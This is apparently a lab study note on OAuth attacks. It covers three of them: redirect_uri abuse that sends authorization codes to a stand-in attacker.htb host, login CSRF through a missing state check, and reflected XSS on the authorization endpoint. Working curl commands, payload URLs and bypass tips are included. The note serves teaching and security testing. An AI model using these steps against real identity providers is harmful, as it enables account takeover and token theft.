# OAuth Attacks

OAuth's authorization code flow has a small number of well-defined attack surfaces. The one that matters most in practice is `redirect_uri` validation — everything else is a consequence of that being weak or absent.

---

## Understanding the Flow

The authorization-code flow in the lab setup:

1. Client sends the browser to: `/authorization/auth?response_type=code&client_id=<id>&redirect_uri=/client/callback&state=<random>`
2. IdP shows a login/consent page.
3. User authenticates → IdP redirects to `redirect_uri?code=<authcode>&state=<random>`.
4. Client receives the code, exchanges it server-to-server for an access token.
5. Client sets an `access_token` cookie containing a JWT.

The `state` parameter is a CSRF token — the client stores it in a cookie, includes it in the authorization request, and compares it to what comes back in the redirect. If `state` is missing or not validated, an attacker can trigger step 3 with their own authorization code to hijack the victim's session.

---

## Stealing Access Tokens via redirect_uri Abuse

**Vulnerability:** The authorization server doesn't validate `redirect_uri` against the registered value for the client.

**Attack:**
1. Craft an authorization URL with `redirect_uri` pointing at the attacker's server:
   ```
   /authorization/auth?response_type=code&client_id=<client_id>&redirect_uri=http://attacker.htb/callback&state=x
   ```
2. Get a victim user to open that URL (social engineering, stored link, etc.).
3. After authentication, the IdP redirects to `http://attacker.htb/callback?code=<authcode>&state=x`.
4. The attacker's server logs the code.
5. Replay the code to the real client callback:
   ```bash
   curl -s -c cookies.txt -b "state=x" "http://TARGET/client/callback?code=<authcode>&state=x"
   ```
6. The client exchanges it for an access token tied to the victim's account.

**Why this works:** The access token exchange happens server-to-server (client → authorization server). The client trusts any code it receives via the callback regardless of where it came from. The authorization server never verified that `redirect_uri` matched what was registered.

**What to look for:** When the sign-in form renders, check the hidden `redirect_uri` field — that's the canonical value the auth server has registered for this client. Anything you send in the query string that differs from this should be rejected.

---

## CSRF via Missing state Parameter

**Vulnerability:** The client doesn't generate or validate a `state` parameter in the OAuth flow.

**Attack (Login CSRF):**
1. Attacker initiates an OAuth flow on their own account, gets to the redirect step, but doesn't follow the redirect yet.
2. Constructs a URL: `http://TARGET/client/callback?code=<attacker_authcode>&state=` (attacker's authorization code).
3. Tricks the victim into visiting that URL while authenticated to the client.
4. The client exchanges the *attacker's* auth code → the victim's session is now bound to the attacker's account.

This is how Login-CSRF works in OAuth: the attacker grafts their account onto the victim's browser session. Useful when the victim has something valuable in their account (credit cards, saved data) that the attacker wants to access.

**Prerequisite:** No `state` validation, or predictable `state` values. The standard fix is a cryptographically random `state` stored in the session/cookie.

---

## Reflected XSS on the Authorization Endpoint

**Vulnerability:** The authorization server reflects query parameters (`state`, `client_id`, `redirect_uri`) into hidden `<input>` fields without HTML-encoding.

**Detection:**
```bash
curl -s 'http://TARGET/authorization/auth?response_type=code&client_id=test&redirect_uri=/x&state="><script>alert(1)</script>' | grep state
# If you see:  value=""><script>alert(1)</script>"  → XSS
```

**Impact:** The authorization server's origin runs attacker-controlled JavaScript. This can steal login-flow cookies, exfiltrate CSRF tokens from the consent page, or redirect the OAuth flow entirely.

**Why the parameters end up unescaped:** The authorization endpoint passes query parameters to a template that displays them in the consent form. If the template doesn't HTML-encode values before inserting them into attribute contexts, `"` breaks the attribute, and `>` closes the tag.

---

## Quick Reference

| Attack | Prerequisite | What you get |
|--------|-------------|--------------|
| `redirect_uri` abuse | No redirect_uri validation | Steal auth codes → access tokens |
| Missing `state` | No CSRF protection on callback | Login CSRF → victim session hijack |
| Reflected XSS on auth endpoint | Unsanitized parameter reflection | JS execution on auth server origin |

When testing OAuth: always check the registered `redirect_uri` value (visible in hidden form fields), try appending paths to it (`/client/callback/../attacker`), and try open redirects that chain to your server. Some servers validate prefix but not the full path.
